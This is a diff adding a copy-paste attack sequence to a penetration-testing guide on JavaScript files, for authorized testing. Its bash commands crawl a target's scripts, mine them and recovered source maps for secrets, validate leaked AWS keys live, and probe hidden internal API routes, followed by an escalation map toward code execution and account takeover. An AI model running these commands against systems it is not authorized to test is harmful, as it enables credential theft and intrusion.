@@ -1,7 +1,39 @@
 # JS-Files Arsenal — Secret Regexes, Extractors, Sink Greps & Source-Map Recovery (copy-paste)
 
+**Author:** x8bitranjit
+
 > Companion to `JS_FILES_TESTING_GUIDE.md`. Authorized testing only. The win condition is never "a match" — it's a
 > **live + privileged secret**, a **firing DOM XSS**, or a **working unauthorized API call** (Guide §10/§12/§14).
+
+---
+
+## 0. The whole attack in one sequence (worked end-to-end in Guide §11.1)
+*Copy-paste spine: harvest → recover source → mine → validate → name-the-ceiling → stop. Reject the public keys; chase the one that runs code.*
+
+```bash
+T=app.target.com
+# 1. HARVEST current + HISTORICAL (old bundles keep live-but-"rotated" keys)
+katana -u https://$T -d 3 -jc -kf all -silent | grep -Ei '\.js(\?|$)' | anew js_urls.txt
+echo $T | gau --subs | grep -Ei '\.js(\?|$)' | anew js_urls.txt
+while read u; do curl -s -L --max-time 20 -A 'Mozilla/5.0' "$u" \
+  -o "out/js/$(echo "$u"|md5sum|cut -c1-12)_$(basename "${u%%\?*}")"; done < js_urls.txt
+
+# 2. BEAUTIFY + mine, then REJECT the public keys (AIza=Maps/Firebase, pk_=Stripe PUBLISHABLE, Sentry DSN = NOT findings)
+npx js-beautify -r out/js/*.js >/dev/null
+python3 poc/secret_scan.py -d out/js -o secrets.txt
+
+# 3. RECOVER original source from a leftover .map (the JS-distinct move) — try it even if unreferenced
+tail -c 200 out/js/main*.js | grep -o 'sourceMappingURL=.*'
+curl -s -o main.map -w '%{http_code}\n' https://$T/static/js/main.<hash>.js.map      # 200 = jackpot
+python3 poc/sourcemap_unpack.py -f main.map -o out/src
+grep -RniE '(secret|password|todo|fixme|internal|admin|api[_-]?key)' out/src          # re-mine the ORIGINAL source
+
+# 4. VALIDATE the real secret LIVE + PRIVILEGED, read-only, then STOP
+AWS_ACCESS_KEY_ID=… AWS_SECRET_ACCESS_KEY=… aws sts get-caller-identity               # 200 + prod IAM ARN = Critical
+# 5. NAME the ceiling (cloud key→SSM/Lambda run-command = shell) — report it; detonate only on your OWN resource.
+# 6. BONUS: hidden /api/internal/... route from the source → call with a NORMAL account → 200 = broken authz (one own-vs-own).
+```
+**Cash-out map by artifact:** live cloud/CI/signing secret → **RCE/supply-chain/forged-auth (Critical, §11)** · DOM sink + controllable source → **DOM XSS → ATO (High, §12)** · recursive-merge sink → **prototype pollution → gadget (§13)** · hidden endpoint → **IDOR/authz/SSRF (§14)**. Public client keys, endpoint lists, and the source map alone = **leads, not headlines**.
 
 ---
 
